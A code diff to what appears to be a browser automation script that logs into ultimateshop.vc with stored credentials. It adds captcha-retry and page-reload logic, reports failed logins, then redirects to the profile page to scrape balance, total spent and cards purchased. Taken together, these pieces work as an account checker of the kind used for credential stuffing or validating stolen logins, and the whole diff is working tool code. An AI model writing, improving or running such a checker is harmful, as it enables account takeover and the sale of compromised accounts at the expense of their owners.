@@ -142,6 +142,7 @@
 
   const isLogin = location.pathname === "/login";
   const isNews = location.pathname === "/news";
+  const isProfile = location.pathname === "/profile";
 
   if (isLogin) {
     debug("🔑 Login page detected");
@@ -155,7 +156,36 @@
       const usernameField = await waitFor("input[name='LoginForm[username]']");
       const passwordField = await waitFor("input[name='LoginForm[password]']");
       const captchaField = await waitFor("input[name='LoginForm[verifyCode]']");
-      const captchaImg = await waitFor("img[src*='captcha']");
+      
+      // IMPROVEMENT 1: CAPTCHA image with refresh logic (max 3 times)
+      let captchaImg = null;
+      let refreshCount = parseInt(sessionStorage.getItem("captchaRefreshCount") || "0");
+      const maxRefreshAttempts = 3;
+      
+      for (let attempt = 0; attempt <= maxRefreshAttempts; attempt++) {
+        try {
+          captchaImg = await waitFor("img[src*='captcha']", 5000);
+          if (captchaImg && captchaImg.src && captchaImg.complete && captchaImg.naturalWidth > 0) {
+            debug(`Captcha image found on attempt ${attempt + 1}`);
+            break;
+          } else {
+            throw new Error("Captcha image not properly loaded");
+          }
+        } catch (e) {
+          if (attempt < maxRefreshAttempts) {
+            refreshCount++;
+            sessionStorage.setItem("captchaRefreshCount", refreshCount.toString());
+            debug(`Captcha not found, refreshing page (${refreshCount}/${maxRefreshAttempts})...`);
+            await sleep(1000);
+            location.reload();
+            return; // Exit and let the refreshed page handle it
+          } else {
+            debug("❌ Max captcha refresh attempts reached, reporting fail");
+            await reportFail(creds, "Captcha image not found after max refreshes");
+            return;
+          }
+        }
+      }
 
       debug("Filling form...");
       usernameField.value = creds.username;
@@ -187,31 +217,45 @@
   }
 
   if (isNews) {
-    debug("📄 News page detected");
-    await sleep(2500);
+    debug("📄 News page detected - redirecting to profile...");
+    await sleep(1500);
+    
+    // IMPROVEMENT 2: Redirect to profile instead of capturing from news
+    debug("Redirecting to profile page for data capture...");
+    window.location.href = "https://ultimateshop.vc/profile";
+  }
+
+  if (isProfile) {
+    debug("👤 Profile page detected - capturing data...");
+    await sleep(2000);
 
     const creds = JSON.parse(sessionStorage.getItem("lastCreds") || "{}");
     if (!creds.username) return;
 
-    // ENHANCED BALANCE CAPTURE with all data
+    // ENHANCED BALANCE CAPTURE from profile page
     try {
-      // Get balance from the green colored span
-      const balanceEl = document.querySelector("span[style*='color:green'] b");
-      const balance = balanceEl ? balanceEl.textContent.trim() : "0.00";
+      // Get Current Balance
+      let balance = "0.00";
+      const balanceElements = Array.from(document.querySelectorAll("td")).find(el => 
+        el.textContent.trim() === "Current balance:"
+      );
+      if (balanceElements && balanceElements.nextElementSibling) {
+        balance = balanceElements.nextElementSibling.textContent.trim();
+      }
       
-      // Get total spent (look for elements containing "Total spent" or similar)
+      // Get Total Spent
       let totalSpent = "0";
       const totalSpentElements = Array.from(document.querySelectorAll("td")).find(el => 
-        el.textContent.includes("Total spent") || el.textContent.includes("Total Spent")
+        el.textContent.trim() === "Total spent:"
       );
       if (totalSpentElements && totalSpentElements.nextElementSibling) {
         totalSpent = totalSpentElements.nextElementSibling.textContent.trim().replace(/[^\d.]/g, '') || "0";
       }
       
-      // Get cards purchased (look for elements containing "Cards purchased" or similar)
+      // Get Cards Purchased
       let cardsPurchased = "0";
       const cardsElements = Array.from(document.querySelectorAll("td")).find(el => 
-        el.textContent.includes("Cards purchased") || el.textContent.includes("Cards Purchased")
+        el.textContent.trim() === "Cards purchased:"
       );
       if (cardsElements && cardsElements.nextElementSibling) {
         cardsPurchased = cardsElements.nextElementSibling.textContent.trim().replace(/[^\d]/g, '') || "0";
